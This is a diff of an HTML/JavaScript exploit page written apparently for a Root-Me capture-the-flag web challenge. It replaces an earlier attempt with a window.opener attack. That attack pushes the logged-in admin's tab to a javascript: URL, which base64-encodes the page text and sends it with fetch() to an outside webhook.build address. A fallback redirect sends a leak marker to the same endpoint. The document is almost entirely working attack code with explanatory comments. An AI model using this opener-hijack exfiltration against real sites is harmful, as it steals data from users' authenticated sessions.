@@ -1,10 +1,26 @@
-<script>
-  // 1. Open the profile page
-  var win = window.open('http://challenge01.root-me.org:58003/profile');
-
-  // 2. Use the 'opener' relationship to inject the leak
-  // We wait a bit for the page to load
-  setTimeout(() => {
-    win.location = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + document.body.innerText)";
-  }, 1000);
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        if (window.opener) {
+            // We can't READ the admin's page, but we can REDIRECT it.
+            // We redirect the admin's original tab to YOUR webhook.
+            // Because the admin is already logged in, the browser 
+            // might send sensitive data in the Referer header or 
+            // we can try to trigger a 'javascript:' execution on the opener.
+            
+            try {
+                // This attempts to force the admin's original tab to 
+                // execute a script that sends its own content to you.
+                window.opener.location = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(document.body.innerText))";
+            } catch (e) {
+                // If the browser blocks the 'javascript:' redirect, 
+                // we redirect them to a page where the URL itself 
+                // might leak the secret if it's stored in the fragment.
+                window.opener.location = "https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?leak=failed_js_redirect";
+            }
+        }
+    </script>
+    <h1>Exploit active... check your webhook.</h1>
+</body>
+</html>
